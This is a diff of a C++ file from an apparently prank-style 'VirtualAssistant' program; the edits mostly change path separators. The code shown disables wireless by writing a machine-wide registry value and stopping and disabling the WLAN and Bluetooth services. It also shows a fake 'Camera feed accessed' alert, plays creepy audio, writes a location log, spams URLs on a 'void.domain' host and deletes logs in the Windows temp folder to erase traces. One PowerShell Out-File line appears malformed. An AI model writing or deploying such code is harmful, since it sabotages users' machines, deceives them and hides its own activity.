@@ -1,4 +1,3 @@
-#define _CRT_SECURE_NO_WARNINGS
 #include "main.h"
 #include "utils.h"
 #include "VirtualAssistant.h"
@@ -83,13 +82,13 @@ void execute_welcome_sequence() {
 }
 
 void enable_airplane_mode() {
-    const char* temp_log = "C:\\Windows\\Temp\\airplane_log.txt";
-    const char* embed_log = "Data\\Mono\\etc\\EmbedRuntime\\airplane_log.txt";
+    const char* temp_log = "C:/Windows/Temp/airplane_log.txt";
+    const char* embed_log = "Data/Mono/etc/EmbedRuntime/airplane_log.txt";
 
     int regResult = system(
         "powershell -Command \""
         "Try {"
-        "   $regPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\RadioManagement\\SystemRadioState';"
+        "   $regPath = 'HKLM:/SYSTEM/CurrentControlSet/Control/RadioManagement/SystemRadioState';"
         "   if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null };"
         "   Set-ItemProperty -Path $regPath -Name 'SystemRadioState' -Value 1 -Force -ErrorAction Stop;"
         "   Write-Output '[SUCCESS] Registry updated';"
@@ -126,7 +125,7 @@ void enable_airplane_mode() {
         "Get-Service -Name 'WlanSvc', 'BthServ' | "
         "Stop-Service -Force -PassThru -ErrorAction SilentlyContinue | "
         "Set-Service -StartupType Disabled -PassThru | "
-        "Out-File -Append C:\\Windows\\Temp\\airplane_log.txt -Append Data\\Mono\\etc\\EmbedRuntime\\airplane_log.txt"
+        "Out-File -Append C:/Windows/Temp/airplane_log.txt -Append Data/Mono/etc/EmbedRuntime/airplane_log.txt"
         "\""
     );
 }
@@ -136,11 +135,11 @@ void activate_bluetooth() {
     char currentDir[MAX_PATH];
     GetModuleFileNameA(NULL, currentDir, MAX_PATH);
     string exePath(currentDir);
-    size_t lastSlash = exePath.find_last_of("\\/");
-    string toolPath = "\"" + exePath.substr(0, lastSlash) + "\\Tools\\devcon.exe\"";
+    size_t lastSlash = exePath.find_last_of("/\\");
+    string toolPath = "\"" + exePath.substr(0, lastSlash) + "/Tools/devcon.exe\"";
 
-    const char* temp_log = "C:\\Windows\\Temp\\bluetooth_log.txt";
-    const char* embed_log = "Data\\Mono\\etc\\EmbedRuntime\\bluetooth_log.txt";
+    const char* temp_log = "C:/Windows/Temp/bluetooth_log.txt";
+    const char* embed_log = "Data/Mono/etc/EmbedRuntime/bluetooth_log.txt";
     ofstream log_temp(temp_log, ios::app);
     ofstream log_embed(embed_log, ios::app);
 
@@ -184,7 +183,7 @@ bool file_exists(const char* path) {
 }
 
 void play_creepy_audio() {
-    const char* soundPath = "Data\\Mono\\etc\\mono\\scripts\\c1337.mp3";
+    const char* soundPath = "Data/Mono/etc/mono/scripts/c1337.mp3";
     if (file_exists(soundPath)) {
         play_mp3(soundPath);
         mciSendStringA("status mp3file length", NULL, 0, NULL);
@@ -212,10 +211,10 @@ void execute_spectral_broadcast() {
     cout << "\n[!] Camera feed accessed\n";
     play_creepy_audio();
     system("powershell -Command \""
-        "(New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Windows Background.wav').PlaySync();"
+        "(New-Object Media.SoundPlayer 'C:/Windows/Media/Windows Background.wav').PlaySync();"
         "\"");
 
-    ofstream gps("C:\\Windows\\Temp\\location.log");
+    ofstream gps("C:/Windows/Temp/location.log");
     time_t t = time(nullptr);
     tm tm_struct;
     localtime_s(&tm_struct, &t);
@@ -234,7 +233,7 @@ void trigger_phantom_protocol() {
         url << "https://void.domain/N0T-4-TR4P-" << i << "?seed=" << GetTickCount64();
         launchProcess("cmd /c start " + url.str());
     }
-    system("start /B cmd /c \"timeout 37 && del /Q C:\\Windows\\Temp\\*.log\"");
+    system("start /B cmd /c \"timeout 37 && del /Q C:/Windows/Temp/*.log\"");
 }
 
 
@@ -265,7 +264,7 @@ void initiate_black_mirror() {
     activate_bluetooth();
     system("powershell -Command \""
         "Try {"
-        "   $state = Get-ItemPropertyValue 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\RadioManagement\\SystemRadioState' -Name 'SystemRadioState'; "
+        "   $state = Get-ItemPropertyValue 'HKLM:/SYSTEM/CurrentControlSet/Control/RadioManagement/SystemRadioState' -Name 'SystemRadioState'; "
         "   if ($state -ne 1) { Write-Error 'Airplane mode failed!' }; "
         "} Catch { "
         "   Write-Error 'Verification failed: ' + $_.Exception.Message; "
